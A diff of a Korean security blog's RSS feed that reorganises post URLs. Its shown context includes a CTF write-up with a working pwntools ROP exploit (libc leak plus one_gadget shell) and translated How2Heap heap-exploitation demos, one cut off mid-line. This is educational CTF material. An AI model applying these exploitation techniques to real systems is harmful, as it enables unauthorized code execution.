@@ -8,8 +8,27 @@
     <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>j0n9yhun&#39;s repository</description>
-    <pubDate>Thu, 05 Dec 2019 14:23:48 GMT</pubDate>
+    <pubDate>Thu, 05 Dec 2019 14:40:09 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title></title>
+      <link>http://j0n9hyun.github.io/2019/12/05/test/</link>
+      <guid>http://j0n9hyun.github.io/2019/12/05/test/</guid>
+      <pubDate>Thu, 05 Dec 2019 14:39:03 GMT</pubDate>
+      <description>
+      
+        
+        
+          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;
+        
+      
+      </description>
+      
+      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css">]]></content:encoded>
+      
+      <comments>http://j0n9hyun.github.io/2019/12/05/test/#disqus_thread</comments>
+    </item>
     
     <item>
       <title> </title>
@@ -51,8 +70,8 @@
     
     <item>
       <title>Notion 앱 추천</title>
-      <link>http://j0n9hyun.github.io/2019/09/13/Notion-%EC%95%B1-%EC%B6%94%EC%B2%9C/</link>
-      <guid>http://j0n9hyun.github.io/2019/09/13/Notion-%EC%95%B1-%EC%B6%94%EC%B2%9C/</guid>
+      <link>http://j0n9hyun.github.io/2019/09/13/daily/Notion-%EC%95%B1-%EC%B6%94%EC%B2%9C/</link>
+      <guid>http://j0n9hyun.github.io/2019/09/13/daily/Notion-%EC%95%B1-%EC%B6%94%EC%B2%9C/</guid>
       <pubDate>Thu, 12 Sep 2019 15:52:17 GMT</pubDate>
       <description>
       
@@ -65,13 +84,13 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><img src="https://user-images.githubusercontent.com/16969364/64800131-f86f6d80-d5c0-11e9-8418-9861b3064b97.PNG" alt="Notion"><br>최근에 접하게 된 인생앱이다. 위 사진은 내가 작업하고 있는 워크스페이스인데 쉽고 빠르게 만들 수 있어서 내용 정리를 전부 이곳에다 하고 있다. Free 라이센스는 1000블록 제한이 있는데 가볍게 쓰는 라이트유저라면 충분할 것으로 보인다.<br><br></p><p><img src="https://user-images.githubusercontent.com/16969364/64801125-ce1eaf80-d5c2-11e9-9c0a-f87fb7e9cca0.PNG" alt="Table 작성"><br>Notion으로 넘어간 가장 큰 이유는 바라던 옵션이 여기에 대부분 꽂혀있기도 하고 디자인 미관이 한 몫 더해준다고 생각한다. 어쨋든 대충 노션이 너무 맘에 들었다는 얘기였다.</p>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/09/13/Notion-%EC%95%B1-%EC%B6%94%EC%B2%9C/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/09/13/daily/Notion-%EC%95%B1-%EC%B6%94%EC%B2%9C/#disqus_thread</comments>
     </item>
     
     <item>
       <title>[Pwn.tw] HackNote</title>
-      <link>http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/</link>
-      <guid>http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/</guid>
+      <link>http://j0n9hyun.github.io/2019/07/21/writeups/pwn/Pwn-tw-HackNote/</link>
+      <guid>http://j0n9hyun.github.io/2019/07/21/writeups/pwn/Pwn-tw-HackNote/</guid>
       <pubDate>Sun, 21 Jul 2019 13:52:31 GMT</pubDate>
       <description>
       
@@ -84,7 +103,7 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="hacknote"><a class="markdownIt-Anchor" href="#hacknote"></a> hacknote</h3><hr><p><img src="https://user-images.githubusercontent.com/16969364/63584980-0bea7280-c5d9-11e9-9e75-8c86edf08e49.png" alt="[Exploit]"></p>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/07/21/writeups/pwn/Pwn-tw-HackNote/#disqus_thread</comments>
     </item>
     
     <item>
@@ -108,8 +127,8 @@
     
     <item>
       <title>2019 디미고 CTF 일반부 3등</title>
-      <link>http://j0n9hyun.github.io/2019/07/07/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/</link>
-      <guid>http://j0n9hyun.github.io/2019/07/07/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/</guid>
+      <link>http://j0n9hyun.github.io/2019/07/07/daily/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/</link>
+      <guid>http://j0n9hyun.github.io/2019/07/07/daily/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/</guid>
       <pubDate>Sun, 07 Jul 2019 12:40:25 GMT</pubDate>
       <description>
       
@@ -122,7 +141,7 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="한국디지털미디어고등학교-ctf-일반부-결과"><a class="markdownIt-Anchor" href="#한국디지털미디어고등학교-ctf-일반부-결과"></a> 한국디지털미디어고등학교 CTF 일반부 결과</h3><p><img src="https://user-images.githubusercontent.com/16969364/60768543-28514f00-a100-11e9-9649-5ae3a1395670.PNG" alt="순위"></p>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/07/07/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/07/07/daily/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/#disqus_thread</comments>
     </item>
     
     <item>
@@ -165,8 +184,8 @@
     
     <item>
       <title>Windows Terminal 시작 터미널 변경</title>
-      <link>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</link>
-      <guid>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</guid>
+      <link>http://j0n9hyun.github.io/2019/06/27/daily/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</link>
+      <guid>http://j0n9hyun.github.io/2019/06/27/daily/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</guid>
       <pubDate>Wed, 26 Jun 2019 16:58:15 GMT</pubDate>
       <description>
       
@@ -179,7 +198,7 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="windows-terminal-시작-터미널-변경-방법"><a class="markdownIt-Anchor" href="#windows-terminal-시작-터미널-변경-방법"></a> Windows Terminal 시작 터미널 변경 방법</h3><p>드디어 윈도우 터미널 프리뷰 버전이 스토어에 릴리즈 됐다.<br>줄곧 WSL관련 기능들을 써왔던 나로썬 매우 반가운 소식이었다. 호다닥 설치하고 잠깐 사용해봤는데 나름대로 만족한다. 그리고 글 쓰다가 알게된 사실인데 마우스 커서를 오른쪽에 대고 드래그해야 터미널을 이동시킬 수 있다. 이 부분은 살짝 불편하긴한데 뭐 적응되겠지. 이제 올 겨울 정식 릴리즈될 WSL2만 남았다.</p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199695-7902b580-987f-11e9-9f6d-e079cbd1c586.PNG" width="650px"><small><center>[Windows Terminal Preview]</center></small> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199726-84ee7780-987f-11e9-8eb1-86a9afa6534a.PNG" width="700px"><small><center>[Windows Terminal 시작 화면]</center></small> <br>어쨋든 터미널을 켜면 디폴트로 파워쉘이 띄워진다. + 버튼엔 파워쉘 외에 cmd, ubuntu를 추가로 띄울 수 있는데 본인은 파워쉘을 안 쓰니 켜자마자 파워쉘 나오고 또 우분투로 바꾸기가 번거롭지 않은가? 그래서 설정을 살펴보니 역시 바꿀 수 있었다.<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199797-acdddb00-987f-11e9-9703-0eeb2e32a28c.PNG" width="700px"><small><center>[설정창]</center></small> <br>사진에 보이는 defaultProfile을 우분투의 profile로 바꿔주면 된다. <br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199799-acdddb00-987f-11e9-8c64-d31e96d7339b.PNG" width="650px"><small><center>[Ubuntu Profile]</center></small> <br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199839-c54df580-987f-11e9-9b16-23848852d411.PNG"><small><center>[적용 화면]</center></small> <br><style>img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/06/27/daily/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/#disqus_thread</comments>
     </item>
     
     <item>
@@ -260,8 +279,8 @@
     
     <item>
       <title>IDA Pro 7.2 한글 스트링 지원</title>
-      <link>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</link>
-      <guid>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</guid>
+      <link>http://j0n9hyun.github.io/2019/06/24/daily/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</link>
+      <guid>http://j0n9hyun.github.io/2019/06/24/daily/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</guid>
       <pubDate>Mon, 24 Jun 2019 10:04:12 GMT</pubDate>
       <description>
       
@@ -274,7 +293,7 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="ida-pro-72-한글-스트링-지원"><a class="markdownIt-Anchor" href="#ida-pro-72-한글-스트링-지원"></a> IDA Pro 7.2 한글 스트링 지원</h3><p>7.0 버전까지만 해도 clt 파일을 따로 추가해줘야 했는데 7.2 부턴 그냥 한줄 추가만 해주면 된다. <a href="http://egloos.zum.com/shadowxx/v/11310107" target="_blank" rel="noopener">제작자</a>가 파일을 보냈다고 했는데 회사에서 잘 반영해준 것 같다. 상단의 주석에도 IDA 사용자가 제공해줬다고 적혀있다.</p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60010989-d3e7b180-96b3-11e9-94e7-7a83b0a31d89.PNG"><center><small> [Korean.clt] </small><center> <br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60011395-a94a2880-96b4-11e9-8ae8-860ac2d98aa7.PNG"><center><small> [IDA Pro 7.2] </small><center> <br><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style></center></center></center></center>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/06/24/daily/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/#disqus_thread</comments>
     </item>
     
     <item>
@@ -298,8 +317,8 @@
     
     <item>
       <title>IDA Pro 한글 스트링 적용 방법</title>
-      <link>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/</link>
-      <guid>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/</guid>
+      <link>http://j0n9hyun.github.io/2019/06/13/daily/ida-7.0-korean-string-apply/</link>
+      <guid>http://j0n9hyun.github.io/2019/06/13/daily/ida-7.0-korean-string-apply/</guid>
       <pubDate>Thu, 13 Jun 2019 04:37:48 GMT</pubDate>
       <description>
       
@@ -312,13 +331,13 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="ida-pro-korean-string-적용-방법"><a class="markdownIt-Anchor" href="#ida-pro-korean-string-적용-방법"></a> IDA Pro Korean String 적용 방법</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3284234/korean.zip" target="_blank" rel="noopener"><strong>패치 파일</strong></a></p><p>바이너리 파일에  영어가 아닌 다른 언어가 입력돼있으면 IDA에서는 <code>puts(byte_8048840)</code> 처럼 한글 그대로 나오지 않는 것을 볼 수 있다. 물론 대부분은 영어로 작성돼있고 이렇게 돼있는다 한들, 보는 데 크게 지장을 주진 않지만 그래도 한번 찾아본 결과, 방법을 알아볼 수 있었다.</p><center><p><strong><code>해당 설명은 IDA Pro 7.0 버전을 기준으로 설명한다.</code></strong></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404563-f2ab9580-8de1-11e9-82d1-00d5fa782281.PNG"><center><small> [IDA Pro] </small></center> <br>우선 위에 있는 패치 파일을 다운 받고 압축을 풀어서 IDA 설치 경로 안에 있는 cfg 폴더에 넣어준다.<p><code>기본경로:C:\Program Files\IDA 7.0\cfg</code><br><br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404811-f986d800-8de2-11e9-871d-d51cd03012a8.PNG"><center><small> [ida.cfg] </small></center> <br>다음 ida.cfg 파일을 열어서 분홍박스처럼 한 줄 추가해주면 적용이 완료된다.(앞에 주석을 실수로 달았다. //는 빼주자)<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404273-f0950700-8de0-11e9-9ff4-900da4536761.PNG"><center><small> [적용 화면] </small></center><center><p><strong><code>세 줄 요약</code><br><code>1. 패치 파일 다운 받아서 압축 품</code><br><code>2. 파일을 IDA 설치 경로에 있는 cfg 폴더 안에 넣음</code><br><code>3. ida.cfg 파일에 한 줄 추가함</code></strong></p></center><p><a href="http://m.egloos.zum.com/shadowxx/v/11310107" target="_blank" rel="noopener">Source</a></p><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style></center>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/06/13/daily/ida-7.0-korean-string-apply/#disqus_thread</comments>
     </item>
     
     <item>
       <title>HSCTF 2019 Combo Chain</title>
-      <link>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</link>
-      <guid>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</guid>
+      <link>http://j0n9hyun.github.io/2019/06/09/writeups/pwn/HSCTF-2019-Combo-Chain/</link>
+      <guid>http://j0n9hyun.github.io/2019/06/09/writeups/pwn/HSCTF-2019-Combo-Chain/</guid>
       <pubDate>Sat, 08 Jun 2019 22:28:42 GMT</pubDate>
       <description>
       
@@ -331,7 +350,7 @@
       
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="combo-chain"><a class="markdownIt-Anchor" href="#combo-chain"></a> Combo Chain</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3268976/combo-chain.zip" target="_blank" rel="noopener"><strong>Binary File</strong></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./combo-chain')</span></span><br><span class="line">r = remote(<span class="string">'pwn.hsctf.com'</span>, <span class="number">2345</span>)</span><br><span class="line">e = ELF(<span class="string">'./combo-chain'</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">gets_offset = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">gets_got = e.got[<span class="string">'gets'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000401263</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">nop = <span class="number">0x000000000040114f</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(gets_got)</span><br><span class="line">p += p64(nop)</span><br><span class="line">p += p64(printf_plt)</span><br><span class="line">p += p64(main)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - gets_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>]]></content:encoded>
       
-      <comments>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/#disqus_thread</comments>
+      <comments>http://j0n9hyun.github.io/2019/06/09/writeups/pwn/HSCTF-2019-Combo-Chain/#disqus_thread</comments>
     </item>
     
     <item>
@@ -370,25 +389,6 @@
       <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="house_of_spiritc"><a class="markdownIt-Anchor" href="#house_of_spiritc"></a> House_of_spirit.c</h3><p><img src="https://user-images.githubusercontent.com/16969364/63588772-43a9e800-c5e2-11e9-820d-a09ceabe5aaa.png" alt="house_of_spirit.c"></p><p><code>house of spirit</code><br>malloc을 한 번 호출해서 메모리를 설정한다.<br>이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.<br>이 영역(메모리 길이: 80)은 chunk가 2개 있다. 첫번째는 <code>0x7fffffffe338</code>에서 시작하고 두번째는 <code>0x7fffffffe378</code>에서 시작한다.<br>이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.<br>이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, <code>0x7fffffffe338</code><br>overwrite된 포인터를 free한다.<br>-------free(a)-------<br>next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반환할 것이다. 그러면 <code>0x7fffffffe340</code>이 될 것이다!<br><code>malloc(0x30): 0x7fffffffe340</code></p>]]></content:encoded>
       
       <comments>http://j0n9hyun.github.io/2019/05/29/theory/How2Heap-House-of-spirit-c/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>[How2Heap] unsafe_unlink</title>
-      <link>http://j0n9hyun.github.io/2019/05/29/theory/How2Heap-unsafe-unlink-c/</link>
-      <guid>http://j0n9hyun.github.io/2019/05/29/theory/How2Heap-unsafe-unlink-c/</guid>
-      <pubDate>Wed, 29 May 2019 05:50:05 GMT</pubDate>
-      <description>
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;unsafe_unlinkc&quot;&gt;&lt;a class=&quot;markdow
-        
-      
-      </description>
-      
-      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="unsafe_unlinkc"><a class="markdownIt-Anchor" href="#unsafe_unlinkc"></a> unsafe_unlink.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04/16.04 64bit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"global chunk0_ptr: %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"corrupt할 victim chunk: %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 fake chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"만약 우리가 일반적으로 free된 chunk0이 